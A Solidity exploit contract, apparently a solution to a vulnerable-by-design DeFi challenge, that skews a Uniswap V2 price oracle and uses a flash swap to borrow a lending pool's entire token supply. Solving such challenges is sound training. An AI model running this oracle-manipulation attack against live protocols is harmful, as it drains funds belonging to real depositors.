// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {PuppetV2Pool} from "./PuppetV2Pool.sol";
import {UniswapV2Library} from "./UniswapV2Library.sol";
import {WETH} from "solmate/tokens/WETH.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract AttackPool is IUniswapV2Callee{
    PuppetV2Pool public immutable pool;
    address public immutable factory;
    address public immutable pair;
    address public immutable owner;
    address public immutable recovery;
    IERC20 private token;
    WETH private weth;

    constructor(address _token, address _weth,PuppetV2Pool _pool, address _pair, address _factory, address _recovery) payable {
        token = IERC20(_token);
        weth = WETH(payable(_weth));
        pool = _pool;
        owner = msg.sender;
        pair = _pair;
        factory = _factory;
        recovery = _recovery;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == pair, "Invalid caller");
        require(sender == address(this), "Invalid sender");
        WETH(weth).deposit{value: 20 ether}();
        uint256 amountWeth_expected;
        uint256 amountToken_expected;
        (amountWeth_expected, amountToken_expected) = abi.decode(data, (uint256, uint256));
        require(amount0 == amountWeth_expected, "Invalid amount0");
        require(amount1 == amountToken_expected, "Invalid amount1");
        uint256 repay = (amountWeth_expected * 1000 ) / 997 + 1; 
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(1_000_000e18);
        weth.transfer(address(pair), repay);
        token.transfer(address(pair), amountToken_expected);
    

    }

    function attack() public {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: factory, tokenA: address(weth), tokenB: address(token)});
        uint256 token_prediction = UniswapV2Library.getAmountOut(10000e18, reservesToken, reservesWETH);
        IERC20(address(token)).transfer(pair, 10000e18);
        IUniswapV2Pair(pair).swap(token_prediction, 0, address(this), "");
        bytes memory amountData = abi.encode(weth.balanceOf(address(pair))-1,0);
        IUniswapV2Pair(pair).swap(weth.balanceOf(address(pair))-1,0,address(this),amountData);
        token.transfer(recovery, token.balanceOf(address(this)));
    }
    receive() external payable {}
}